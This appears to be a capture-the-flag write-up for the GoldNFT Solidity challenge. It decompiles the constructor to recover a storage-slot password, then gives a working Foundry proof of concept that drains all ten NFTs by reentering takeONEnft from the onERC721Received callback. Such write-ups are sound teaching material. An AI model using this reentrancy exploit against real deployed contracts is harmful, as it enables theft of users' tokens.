# Find out what the constructor of `GoldNFT` does

The creation code is the call data of the transaction that creates the contract. Copy it from etherscan and decompile using the [decompiler](https://library.dedaub.com/decompile), it shows:
```solidity
function __function_selector__() public payable { 
    MEM[64] = 128;
    require(!msg.value);
    STORAGE[keccak256(msg.sender)] = 1;
    return MEM[0 len 535];
}
```
So this is what the constructor does: 
- Store the value of `keccak256(msg.sender)` to storage slot 1, which is `keccak256(0x302fF1c5F7e264b792876B9456F42de8dF299863)`

We can also verify this on [playground](https://www.evm.codes/playground) by single stepping through, it does that with opcodes `CALLER` and `SHA3`.

# Runtime code
The runtime code can be obtained from [etherscan](https://goerli.etherscan.io/address/0xe43029d90B47Dd47611BAd91f24F87Bc9a03AEC2#code), the decompiler shows the function `read` as:
```solidity 
function read(bytes32 varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0);
    return STORAGE[varg0];
}
```
The argument is the slot, and it checks if the `storage[slot]` is non-zero, the only non-zero value was set in the constructor, so the slot argument should be `keccak256(0x302fF1c5F7e264b792876B9456F42de8dF299863)`

# Reentrancy
So far we can call `takeONEnft` to get 1 NFT, but it can be called only once, we need to use the re-entrancy to call it 9 more times.
When an NFT is transfered and if the target is a contract, a function callback `onERC721Received` is called. We use this callback to call `takeONEnft` again and again to get all 10 NFTs.

# POC (Foundry)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/GoldNFT.sol";

import {IERC721Receiver} from "lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

contract GoldNFTHack is Test {
    GoldNFT nft;
    HackGoldNft nftHack;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() external {
        vm.createSelectFork("goerli", 8591866); 
        nft = new GoldNFT();
    }


    function test_Attack() public {
        vm.startPrank(hacker);
        // solution

		nftHack = new HackGoldNft(address(nft));

		nftHack.get10Nft();

		// end of solution
        assertEq(nft.balanceOf(hacker), 10);
    }
}

contract HackGoldNft is IERC721Receiver {
	bytes32 slot;
	address hacker;
    GoldNFT nft;

	constructor(address _nft) {
		hacker = msg.sender;
		nft = GoldNFT(_nft);

		address creator = 0x302fF1c5F7e264b792876B9456F42de8dF299863;
		slot = keccak256(abi.encode(creator));
	}
	function get10Nft() external {
		nft.takeONEnft(slot);
	}

	function onERC721Received(
		address, address to, uint tokenId, bytes memory 
	) public returns (bytes4 ) {
		// send this nft to hacker
		nft.transferFrom(address(this), hacker, tokenId);

		// do it 9 more times
		if(nft.balanceOf(hacker) < 10) {
			nft.takeONEnft(slot);
		}

		// must return this selector as described here:
		//   https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d59306bd06a241083841c2e4a39db08e1f3722cc/contracts/token/ERC721/IERC721Receiver.sol#L16
		return IERC721Receiver.onERC721Received.selector;
	}
}
```
